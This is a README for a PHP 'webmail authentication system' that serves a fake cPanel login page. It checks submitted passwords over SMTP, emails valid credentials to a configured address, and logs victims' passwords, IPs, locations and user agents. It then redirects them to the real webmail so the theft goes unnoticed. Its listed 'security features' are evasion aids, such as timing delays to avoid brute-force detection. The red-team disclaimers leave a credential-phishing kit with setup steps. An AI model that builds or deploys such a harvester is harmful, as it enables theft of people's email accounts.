# Webmail Authentication System

This is a webmail authentication system designed for **ethical red team testing and security research purposes only**. It validates cPanel webmail credentials and provides appropriate responses based on authentication results.

## ⚠️ IMPORTANT DISCLAIMER

This tool is intended **ONLY** for:
- Authorized penetration testing
- Security research with proper permissions
- Educational purposes in controlled environments
- Testing your own systems

**NEVER use this tool against systems you don't own or have explicit permission to test.**

## Features

### For Valid Credentials:
- ✅ Authenticates against SMTP server
- ✅ Sends notification email with credentials
- ✅ Logs successful authentication attempts
- ✅ Redirects to actual webmail interface
- ✅ Provides success message

### For Invalid Credentials:
- ❌ Shows connection error message (not "invalid password")
- ❌ Logs failed attempts
- ❌ No email notification sent
- ❌ Stays on login form

## Files

- `webmail_auth.php` - Main authentication script
- `webmail_login.html` - Login form interface
- `SS-Or-LucaGherardi-Tests.txt` - Log file (created automatically)

## Setup Instructions

1. **Install PHPMailer** (if not already installed):
   ```bash
   composer require phpmailer/phpmailer
   ```

2. **Configure SMTP Settings** in `webmail_auth.php`:
   ```php
   $receiver     = 'your-email@domain.com';     // Where to send notifications
   $senderuser   = 'your-sender@domain.com';    // SMTP username
   $senderpass   = 'your-smtp-password';        // SMTP password
   $senderport   = 587;                         // SMTP port
   $senderserver = 'mail.yourdomain.com';       // SMTP server
   $smtp_secure  = 'tls';                       // Security type
   ```

3. **Upload files** to your web server

4. **Access the login form** at `webmail_login.html`

## How It Works

1. **User submits credentials** via the web form
2. **PHP script attempts SMTP authentication** using provided credentials
3. **If valid:**
   - Logs the successful attempt
   - Sends notification email with credentials
   - Returns success response with redirect URL
   - Frontend redirects to actual webmail
4. **If invalid:**
   - Logs the failed attempt
   - Returns connection error message
   - Frontend shows error without revealing authentication status

## Security Features

- **CORS headers** for cross-origin requests
- **Session tracking** for attempt counting
- **Geolocation logging** for security monitoring
- **User agent logging** for fingerprinting
- **Timing delays** to prevent brute force detection
- **Connection error messages** instead of "invalid password"

## Log Format

Each authentication attempt is logged with:
- Timestamp
- Email and password
- Domain
- IP address
- Country (via geolocation)
- User agent
- Authentication status
- Email notification status

## Ethical Usage Guidelines

1. **Only test systems you own or have explicit permission to test**
2. **Respect rate limits and don't overload servers**
3. **Use in controlled environments only**
4. **Follow responsible disclosure if vulnerabilities are found**
5. **Comply with all applicable laws and regulations**

## Legal Notice

This tool is provided for educational and authorized testing purposes only. Users are responsible for ensuring they have proper authorization before using this tool. The authors are not responsible for any misuse of this software.

## Support

For questions about ethical usage or technical support, please ensure you're using this tool responsibly and in accordance with applicable laws and regulations.